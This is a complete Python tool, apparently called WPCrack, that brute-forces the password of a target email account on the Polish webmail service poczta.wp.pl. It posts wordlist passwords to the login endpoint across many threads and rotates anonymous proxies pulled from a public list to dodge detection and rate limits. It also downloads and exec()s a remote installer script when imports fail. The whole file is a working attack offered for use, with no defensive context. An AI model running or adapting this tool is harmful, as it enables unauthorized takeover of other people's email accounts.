def exit(exit_code):
	global wordlist
	try:wordlist
	except NameError:pass
	else:wordlist.close()
	if exit_code:
		print_exc()
	stdout.write('\r[INFO] Exitting with exit code %d\n'%exit_code)
	_exit(exit_code)
def logv(message):
	global args
	stdout.write('%s\n'%message)
	if message.startswith('[ERROR]'):
		exit(1)
	try:args
	except NameError:pass
	else:
		if args.debug:
			if message.startswith('[WARNING]'):
				exit(1)

if __name__=='__main__':
	from os import _exit
	from sys import stdout
	from traceback import print_exc
	while True:
		try:
			from random import choice
			from OpenSSL.SSL import Error as SSLError
			from argparse import ArgumentParser
			from requests import get as requests_get,post as requests_post
			from requests.exceptions import RequestException
			from traceback import print_exc
			from threading import Thread,Lock,enumerate as list_threads
			break
		except:
			try:INSTALLED
			except NameError:
				try:from urllib import urlopen
				except:from urllib.request import urlopen
				argv=['WPCrack',False]
				exec(urlopen('https://raw.githubusercontent.com/DeBos99/multi-installer/master/install.py').read().decode())
			else:exit(1)

def log(message):
	global args
	if args.verbose:
		logv(message)
def get_proxies():
	global args
	if args.proxies:
		proxies=open(args.proxies,'r').read().strip().split('\n')
	else:
		proxies=requests_get('https://www.proxy-list.download/api/v1/get?type=https&anon=elite').content.decode().strip().split('\r\n')
	log('[INFO] %d proxies successfully loaded!'%len(proxies))
	return proxies
def bot(id):
	global args,locks,proxies,wordlist
	while True:
		with locks[1]:
			try:
				password=next(wordlist).strip()
			except:break
		log('[INFO][%d] Setting password to %s'%(id,password))
		while True:
			try:
				with locks[0]:
					if len(proxies)==0:
						proxies.extend(get_proxies())
					proxy=choice(proxies)
					proxies.remove(proxy)
				log('[INFO][%d] Connecting to %s'%(id,proxy))
				response=requests_post(
					'https://poczta.wp.pl/login/v1/token',
					params={
						'zaloguj':'poczta'
					},
					data={
						'login_username':args.email,
						'password':password
					},
					proxies={
						'https':proxy
					},
					timeout=10,
					allow_redirects=False
				)
				if len(response.cookies):
					logv('[INFO][%d] Successfully cracked password: %s'%(id,password))
					exit(0)
				else:
					logv('[INFO][%d] Invalid password: %s'%(id,password))
				break
			except (RequestException,SSLError) as e:
				log('[WARNING][%d] %s'%(id,e.__class__.__name__))
			except KeyboardInterrupt:exit(0)
			except:exit(1)

if __name__=='__main__':
	try:
		parser=ArgumentParser()
		parser.add_argument('-e','--email',help='set target email',required=True)
		parser.add_argument('-w','--wordlist',help='set path to wordlist',required=True)
		parser.add_argument('-t','--threads',type=int,help='set number of threads',default=15)
		parser.add_argument('-p','--proxies',help='set path to file with proxies')
		parser.add_argument('-v','--verbose',help='enable verbose mode',action='store_true')
		parser.add_argument('-d','--debug',help='enable debug mode',action='store_true')
		args=parser.parse_args()
		args.verbose=args.debug or args.verbose
		locks=[Lock() for _ in range(2)]
		proxies=[]
		wordlist=open(args.wordlist,'r')
		for i in range(args.threads):
			t=Thread(target=bot,args=(i+1,))
			t.daemon=True
			t.start()
		for t in list_threads()[1:]:
			t.join()
	except SystemExit as e:exit(int(str(e)))
	except KeyboardInterrupt:exit(0)
	except:exit(1)
